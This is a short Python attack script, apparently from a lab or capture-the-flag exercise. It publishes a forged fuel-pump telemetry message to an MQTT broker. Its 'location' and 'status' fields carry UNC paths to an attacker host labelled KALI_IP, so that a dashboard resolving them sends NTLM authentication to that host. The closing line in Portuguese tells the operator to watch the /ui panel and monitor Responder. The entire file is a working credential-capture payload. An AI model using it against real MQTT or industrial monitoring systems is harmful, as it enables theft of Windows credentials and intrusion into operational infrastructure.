import json
import paho.mqtt.client as mqtt
import time

BROKER = "10.10.100.100"
KALI_IP = "10.10.100.8"

client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)
client.connect(BROKER, 1883, 60)

payload = {
    "pumpId": "PUMP001",
    "location": rf"\\{KALI_IP}\share\local",
    "fuelType": "Diesel S-10",
    "capacityCurrent": 4500,
    "capacityTotal": 5000,
    "capacityPercentage": "90.0",
    "status": rf"\\{KALI_IP}\share\status",
    "timestamp": int(time.time() * 1000)
}

client.publish("fuel-pumps/data", json.dumps(payload))
print("[+] Variante 1 enviada. Olhe o painel /ui e monitore o Responder!")
client.disconnect()
